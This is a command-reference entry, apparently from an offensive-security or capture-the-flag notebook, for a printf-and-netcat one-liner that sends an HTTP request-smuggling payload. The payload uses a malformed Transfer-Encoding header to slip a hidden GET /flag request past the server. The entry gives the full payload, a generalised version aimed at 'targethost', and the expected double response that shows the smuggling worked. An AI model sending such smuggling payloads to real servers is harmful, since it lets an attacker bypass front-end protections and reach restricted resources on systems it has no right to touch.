---
data: >-
  printf "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n ,
  chunked-false\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /flag HTTP/1.1\r\nHost:
  127.0.0.1\r\nfoo: x\r\n\r\n\r\n" | nc localhost 80
tags:
  - payload-sending
  - http-smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 20b3b2b4-b3f0-434c-9dc5-2117b95e06ad
created_at: '2025-12-13T09:01:17.183Z'
updated_at: '2025-12-13T09:01:17.183Z'
verified: false
validated: true
submitted: true
---
# printf-nc-send-payload

## Command

```bash
printf "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n , chunked-false\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /flag HTTP/1.1\r\nHost: 127.0.0.1\r\nfoo: x\r\n\r\n\r\n" | nc localhost 80
```

## Description

Constructs a crafted HTTP payload for smuggling exploitation and sends it to a local server using printf for formatting and nc for transmission.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `printf arguments` | Formats the string with HTTP request lines including malformed Transfer-Encoding | Yes |
| `| nc localhost 80` | Pipes the output to netcat to send to localhost on port 80 | Yes |

## Examples

### Basic Usage

```bash
printf "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n , chunked-false\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /flag HTTP/1.1\r\nHost: 127.0.0.1\r\nfoo: x\r\n\r\n\r\n" | nc localhost 80
```

### Advanced Usage

```bash
printf "[custom payload]" | nc targethost 80
```

## Expected Output

Server responds with two HTTP responses: one for the POST and one for the smuggled GET, instead of a 400 Bad Request.

## Related

- [[procedures/Send-Crafted-Smuggling-Payload]]
- [[tools/printf]]
- [[tools/nc]]
